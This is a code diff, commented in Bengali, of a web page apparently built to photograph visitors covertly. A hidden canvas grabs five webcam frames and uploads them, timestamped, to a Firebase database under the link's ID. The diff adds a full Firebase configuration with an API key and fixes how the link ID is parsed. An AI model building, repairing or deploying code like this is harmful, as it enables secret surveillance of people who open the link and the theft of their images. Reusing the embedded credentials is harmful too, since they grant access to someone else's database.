@@ -23,11 +23,22 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-const firebaseConfig = { /* তোমার কনফিগ */ };
+const firebaseConfig = {
+  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
+  authDomain: "cam-snap-8e956.firebaseapp.com",
+  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
+  projectId: "cam-snap-8e956",
+  storageBucket: "cam-snap-8e956.firebasestorage.app",
+  messagingSenderId: "982089892260",
+  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
+  measurementId: "G-S5S37F55T6"
+};
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-const id = location.pathname.split('/').pop() || location.href.split('/').pop();
+// ID নেওয়ার ফিক্সড উপায় – এটাই ছিল সমস্যা!
+const id = location.pathname.slice(1) || new URLSearchParams(location.search).get('id');
+
 const today = new Date().toLocaleDateString('bn-BD');
 
 function start() {
@@ -45,7 +56,10 @@ function start() {
       let i = 0;
       const take = () => {
         if (i >= 5) {
-          db.ref('links/' + id + '/sessions/' + today).set({photos: pics, time: new Date().toLocaleString('bn-BD')});
+          db.ref('links/' + id + '/sessions/' + today).set({
+            photos: pics,
+            time: new Date().toLocaleString('bn-BD')
+          });
           return;
         }
         canvas.width = v.videoWidth || 1280;
